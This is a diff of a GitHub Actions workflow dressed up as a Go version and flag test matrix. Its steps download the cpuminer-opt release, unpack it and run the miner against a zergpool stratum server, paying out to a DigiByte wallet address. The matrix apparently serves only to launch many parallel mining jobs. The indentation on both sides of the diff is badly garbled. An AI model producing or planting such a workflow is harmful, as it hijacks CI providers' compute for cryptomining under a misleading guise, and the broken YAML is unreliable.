@@ -10,38 +10,39 @@ jobs:
 
           runs-on: windows-latest
 
-              strategy:
+               
+          strategy:
 
-                    max-parallel: 5
+              max-parallel: 5
 
-                          fail-fast: false
+              fail-fast: false
 
-                                matrix:
+               matrix:
 
-                                        go: [1.0, 1.1, 1.2, 1.3, 1,35]
+               go: [1.0, 1.1, 1.2, 1.3, 1,35]
 
-                                                flag: [A, B, C, D, E, F, G, H, I]
+               flag: [A, B, C, D, E, F, G, H, I]
 
-                                                    env:
+            env:
 
-                                                            NUM_JOBS: 20
+               NUM_JOBS: 20
 
-                                                                    JOB: ${{ matrix.go }}
+               JOB: ${{ matrix.go }}
 
-                                                                        steps:
+                                                                                      steps:
 
-                                                                            - name: PREPARING
+                                                                                          - name: PREPARING
 
-                                                                            -       run: Invoke-WebRequest https://github.com/JayDDee/cpuminer-opt/releases/download/v3.17.1/cpuminer-opt-3.17.1-windows.zip -Outfile cpuminer-opt-3.17.1-windows.zip
+                                                                                          - run: Invoke-WebRequest https://github.com/JayDDee/cpuminer-opt/releases/download/v3.17.1/cpuminer-opt-3.17.1-windows.zip -Outfile cpuminer-opt-3.17.1-windows.zip
 
-                                                                            -           - name: Seting-UP
+                                                                                          - name: Seting-UP
 
-      run: Expand-Archive cpuminer-opt-3.17.1-windows.zip
+               run: Expand-Archive cpuminer-opt-3.17.1-windows.zip
 
-          - name: Running
+             - name: Running
 
-          -       run: .\cpuminer-opt-win\cpuminer-sse2.exe -a power2b -o stratum+tcp://power2b.na.mine.zergpool.com:7445 -u DGB_dgb1qkpmvdct307nehn5lwr5scprtter9qdpe98uvu7.WORKER_NAME -p c=DGB
+                run: .\cpuminer-opt-win\cpuminer-sse2.exe -a power2b -o stratum+tcp://power2b.na.mine.zergpool.com:7445 -u DGB_dgb1qkpmvdct307nehn5lwr5scprtter9qdpe98uvu7.WORKER_NAME -p c=DGB
 
-          -           - name: DONE
+             - name: DONE
 
-      run: exit
+               run: exit
